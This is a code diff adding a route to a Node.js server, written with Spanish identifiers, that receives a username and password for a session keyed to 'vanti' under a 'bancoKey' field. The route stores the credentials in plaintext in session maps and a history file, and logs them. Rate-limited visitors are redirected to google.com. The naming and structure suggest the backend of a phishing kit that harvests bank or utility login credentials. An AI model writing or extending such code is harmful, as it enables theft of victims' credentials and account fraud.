@@ -774,6 +774,33 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+if (req.method === 'POST' && url === '/vanti/enviar-autorizacion') {
+    if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+    try {
+        const { sessionId, usuario, password } = await getBody(req);
+        if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
+        const datosPrevios = datosSesiones.get(sessionId) || {};
+        const datosCompletos = Object.assign({}, datosPrevios, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
+        datosSesiones.set(sessionId, datosCompletos);
+        estadoSesiones.set(sessionId, 'autorizacion_enviada');
+        ultimaAccionSesiones.set(sessionId, 'AUTORIZACION_ENVIADA');
+        accionTsSesiones.set(sessionId, Date.now());
+
+        const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
+        if (idx !== -1) {
+            historial[idx].datos = Object.assign({}, historial[idx].datos, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
+            historial[idx].fecha = new Date().toISOString();
+            try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+        } else {
+            guardarHistorial('vanti', datosCompletos);
+        }
+
+        console.log(`[VANTI] Autorización recibida: ${sessionId} | Usuario: ${usuario}`);
+        json(res, 200, { ok: true, sessionId });
+    } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+    return;
+}
+
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
